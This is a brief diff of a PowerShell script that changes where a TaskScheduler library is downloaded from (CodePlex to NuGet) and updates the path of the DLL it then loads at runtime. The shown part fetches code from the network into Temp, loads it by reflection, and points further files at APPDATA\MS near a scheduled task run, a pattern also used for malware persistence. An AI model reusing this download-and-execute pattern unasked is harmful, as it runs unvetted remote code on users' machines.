@@ -57,11 +57,11 @@ $task.Run();
 function ITP{
 $File=$env:Temp+'\ts.zip';
 $Dest=$env:Temp+'\ts';
-(New-Object System.Net.WebClient).DownloadFile('http://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=taskscheduler&DownloadId=1505290&FileTime=131382497241100000&Build=21050',$File);
+(New-Object System.Net.WebClient).DownloadFile('https://api.nuget.org/packages/taskscheduler.2.5.26.nupkg',$File);
 if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
 Unzip $File $Dest;
 rm -Force $File;
-$TSAssembly=$Dest+'\v2.0\Microsoft.Win32.TaskScheduler.dll';
+$TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
 $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
 $TFile=$env:Temp+'\t.zip';
 $DestTP=$env:APPDATA+'\MS';
